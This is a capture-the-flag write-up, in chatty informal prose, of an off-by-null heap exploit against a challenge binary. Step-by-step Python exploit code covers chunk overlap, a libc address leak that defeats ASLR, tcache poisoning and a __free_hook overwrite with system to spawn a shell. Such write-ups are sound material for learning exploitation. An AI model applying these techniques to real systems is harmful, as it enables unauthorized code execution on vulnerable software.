since u alr know the vuln is an off by null iʼll jus go into the meats n potatoes of the exploit process 
like my previous writeup , the idea is to consolidate chunks to overlap a chunk in use ; this is achieved by leveragin the overflow to edit chunk metadata , whether free or in use
this particular exploit alters the size field of a free chunk , shrinkin its size in the free list .. youʼll see this approach used a few times in the exploit

iʼll quote my previous writeup a few times to show how my approach solvin this differed from that based on the constraints i had.
the biggest issue was the fact that i cldnʼt write null bytes for the input data , as this wld cause the input to terminate at the null byte ; additionally the total num of allocations allowed was 10 which was a slight pain to deal with
also unlike the binary in my previous writeup , which allowed a user to provide an index for the structure, this didnʼt , the index was selected by loopin thru the list until we reach an index with no structure in the topic list  ; while this wasnʼt that big of an issue , it was annoying.

havin laid it all out iʼll detail my approach to solvin the chal.

i start of makin 3 allocations, same as my prev writeup but this uses a different approach for consolidation

```python
add_topic('0vflw1', 0x18, b'ill start slow.', 120)
add_topic('0vflw2', 0x188, b'\x41'*0xf0+p64(0x101), 120)
add_topic('vic.tim', 0x1f0, b'ah shit .....', 12)
```

heres the state of the heap after these 3 allocations ; also pay mind to the data of chunk B (middle), ill explain its significance in a minute.

![step_1](https://github.com/kaslr/another_null_chal/blob/main/step_1.PNG)

tho not shown here in the output due to formatting,  thereʼs the value `0x101` @ chunk Bʼs address + offset `0xf0` , why this is important will become apparent in time. also note that this value itself shld be `0x100` bue due to the fact that i canʼt write null bytes , a lil creativity is needed ; this is what the next aloocations n free does.

value @ chunk B addr + offset before:
```python
pwndbg> x/gx 0x55746b553280+0xf0
0x55746b553370: 0x0000000000000101
```

```python
delete_topic(1)
add_topic('0vflw2', 0x188, b'\x41'*0xef, 120)
```
value @ chunk B addr + offset after:
```python
pwndbg> x/gx 0x55746b553280+0xf0
0x55746b553370: 0x0000000000000100
```

whoa thatʼs crazy but why does that work? this shld be prettty easy to figure but if u canʼt wrap ur head around , look closely .. u see how the 1st allocation writes `0xf0` bytes but the second  writes `0xef` ? well since the binary is little endian , @ offset `0xf0`  we have the value `0x101` after the first alloc, the first byte is `0x01` but the second writes 1 byte less which means the first byte @ chunk B address (`0x55746b553280`) plus `0xf0` will have a null byte due to the binaryʼs use of `strcpy`.

```python
for i in range(0, 7):
    add_topic('tcache', 0x180, b'\x42' * 0x30, 10)

for i in range(3, 10):
    delete_topic(i)
```
these next allocations & frees populate the tcache , so subsequent frees of size `0x190` can be put in the unsorted bin ; notice i said `0x190` sized chunks even tho i request `0x180` bytes .. the additional `0x10` bytes is chunk metadata.

```python
delete_topic(0)
delete_topic(1)
```

now we free chunk A & B so B can be put in the unsorted bin. peep the heap memory layout.

![step_2](https://github.com/kaslr/another_null_chal/blob/main/step_2.PNG)

chunk C is the consolidating chunk, see how its `prev_size` field is set to Bʼs size .. in my previous writeup , this was manually done by crafting a fake prev_size value but again due to not bein to write null bytes itʼs impossible to fake the prev_size & trigger the overflow into chunk C ( remember this wld clear the in use bit ) n allow chunk C to consolidate `prev_size` bytes backwards , therefore our victim for today is chunk B.
also pay attention to chunk Bʼs size field -- `0x190`

but how ? letʼs see the next step in the exploit.

```python
add_topic('0vflw1', 0x18, b'\x41'*0x18, 120)
```

remember the previous frees freed chunk A & B , i allocate A back n write the max number of bytes, `0x18`, triggerin the null byte overflow into chunk B . letʼs examine the heap memory after this step

![step_3](https://github.com/kaslr/another_null_chal/blob/main/step_3.PNG)

chunk B shrank! thatʼs precisely what we want. but whatʼs the significance of this shrunken size ? keep up n iʼll show ya

```python
add_topic('vic.tim', 0x80, b'the 128 byte buffer', 12)
add_topic('vic.tim', 0x60, b'the 0x60 byte buffer', 12)
```

these next allocatiosn r from the unsorted bin , they exhaust the bin & now weʼve got 4 chunks that r relevant to the exploit.

- A - used to shrink Bʼs size in the freelist
- B - original B chunk , shrunk in the freelist n also split to alloc the new C
- C - chunk to be overlapped after consolidation - the uaf chunk
- D - old C , the consolidatin chunk

u might (or might not) ask why we shrunk B in the first place when it was in the freelist ; itʼs simply to stop it from updatin chunk Cʼs prev_size field & in-use bit when new allocs r made (C is the new D chunk before we allocʼd a new C chunk) . by shrinking B in the bin , we trick the allocator into updatin an offset of our choosing.

u can peep the heap after this to see weʼve got a new chunk C. D is below itʼs not important rn so i chose not to show it but know its `prev_size` field holds the value `0x190` which was Bʼs initial size.

```python
delete_topic(0)
for i in range(0, 7):
    add_topic('tcache', 0x80, b'\x45' * 0x30, 10)

delete_topic(0)

for i in range(4, 10):
    delete_topic(i)

for i in range(0, 7):
    add_topic('tcache', 0x1f0, b'\x42' * 0x30, 10)

delete_topic(0)
for i in range(4, 10):
    delete_topic(i)

delete_topic(1)
delete_topic(2)

for i in range(0, 7):
    add_topic('tcache', 0x80, b'\x42' * 0x30, 10)
```

weʼve been heap feng shuiʼng tf out this whole thing so we do more grooming stuff.
as u can see these allocs populate the `0x90` & `0x200` bytes tcache but thereʼs also 2 important frees to examine.. `delete_topic(1)` &  `delete_topic(2)` ; these r chunk B & D .. if u remember Bʼs new size is `0x90` (plus chunk metadata) n having filled the `0x90` tcache , it gets put in the unsorted bin. the next free is D whose in-use bit wasnʼt set after allocatin B & C (new chunk) -- this free triggers the consolidation & weʼve therefore overlapped C while itʼs still in use.
the next allocs 7 `0x90` allocs r taken from the tcache & any other wld use the unsorted bin.
also the alloc n frees for the `0x200` chunks is to make sure we donʼt add the consolidatin chunk to the tcache.

peepin Bʼs size field shows weʼve consolidated backwards . now itʼll be treated as a large chunk even if C , still used, lies in this memory region.

![step_5]([image](https://github.com/kaslr/another_null_chal/blob/main/step_5.PNG))

B, C & D r now a single large chunk . any use of C now wld be a use after free. we can leverage this to leak pointers from libc to defeat ASLR.

```python
add_topic('vic.tim', 0x80, b'info l3ak <3 .....', 12)
```
this alloc tricks malloc into splittin the large chunk , servin the requested sized chunk to B & updatin the `fd` & `bk` of the remainder chunk in the bin (chunk Cʼs data region) to a piointer to the `main_arena` struct , which is a sructure in libcʼs .data section. when we then show the contents of chunk C , weʼll be leaking a libc pointer which can be used to calculate the base address of libc.

```python
show_topic(3)
rcu(b'des:')
main_arena = u64(rcu(b't').ljust(8, b'\x00'))-0x60
libc.address = main_arena - libc.sym['main_arena']
__free_hook = libc.sym['__free_hook']
system = libc.sym['system']
print(f'[+] leaked main_arena struct:= 0x{main_arena:x}')
print(f'[+] aslr defeated ; libc base:= 0x{libc.address:x}')
rcl()
```

```python
[+] leaked main_arena struct:= 0x7fb7f0556c40
[+] aslr defeated ; libc base:= 0x7fb7f016b000
```

```python
delete_topic(8)
add_topic('vic.tim', 0x160, b'__free_hook pois0n? <3 .....', 12)
delete_topic(9)
add_topic('vic.tim', 0x160, b'omg ronnie!!!', 12)
delete_topic(9)
delete_topic(3)
```

next we free chunk B (`delete_topic(8)`), this is an important step since this chunk sits right above chunk C .. we then alloc an `0x170` byte chunk , call it E , (again its 160 + metadata) since thereʼs no tcache to service the request we fall to the unsorted bin which happens to be chunk C ; chunk E & C now point to the same memory.
the next alloc (call it X) is so we can have 2 entries in the `0x170` & update the fd of the head node to point to an arbitrary address.
next we free chunk C (`delete_topic(3)`) & X so theyʼre added to the `0x170` tcache.

hereʼs the state of the heap after these steps:

![step_6](https://github.com/kaslr/another_null_chal/blob/main/step_6.PNG)

```python
add_topic('vic.tim', 0x88, b'\x49'*0x88, 12)
delete_topic(8)
delete_topic(6)
add_topic('vic.tim', 0x18, b'/bin/sh', 12)
add_topic('vic.tim', 0xf0, p64(__free_hook-0x8), 12)
```

these next allocs n frees r crucial to the tcache poisoning. having freed chunk B previously, we realloc it n fill the chunk to itʼs max .. this overflows a null byte into the size field of the next chunk which happens to be C .. & E! now weʼve shrunk the size of E to `0x100` which means freein E wld populate the `0x100` tcache!! but why do this ? well since C & E point to the same location we canʼt jus free C and then E ; this wld result in a double free n havin no option to edit a topic a lil creativity is needed . i initially thought to use the unsorted bin but it seemed like overkill .. why not jus leverage the null byte overflow again to shirnk the chunk size frm `0x170` to `0x100` then freein E wld populate the appropriate bin... putting the same chunk in 2 different bins.
& thatʼs what i did. now all thatʼs left is to get a chunk frm the `0x100`, write some address n this wld automatically poison the head node of the `0x170` tcache , effectively pointin itʼs fd pointer to an address of our choosing. a good candidate is the hooks, __free_hook to be precise . thereʼs a slight issue tho __free_hook isnʼt aligned ! well we donʼt gaf shift the pointer back 8 bytes , write 8 bytes of shit & an address we like (e.g system) n any call to free wld trigger the hook -- giving code execution.
also we see a sneaky chunk there with the content `/bin/sh` , thatʼs our old buddy, chunk A.

```python
delete_topic(1)
delete_topic(2)
add_topic('vic.tim', 0x160, b'to pop a shell , or not to pop a shell?', 12)
add_topic('vic.tim', 0x160, b'\x41'*0x8 + p64(system), 12)

print('[+] overwrote __free_hook with system')
print('[*] popping a shell..')

delete_topic(6)
```

the 2 frees do nothin other than give us space for 2 allocs .. then we make 2 allocs ; we donʼt care much for the first but know that thatʼs chunk C .. the second is the prize. the first 8 bytes of that address point to __morecore_hook but we also donʼt care bout that weʼre interested in the next 8 bytes -- __free_hook.
blah blah we overwrite the hook with system, and free chunk A, which is a pointer to the string `/bin/sh` .. this triggers __free_hook which effectivly calls `system` with `/bin/sh` passed in .. ultimately popping a shell!

i had fun with this one tbh & i hope u the reader do too.
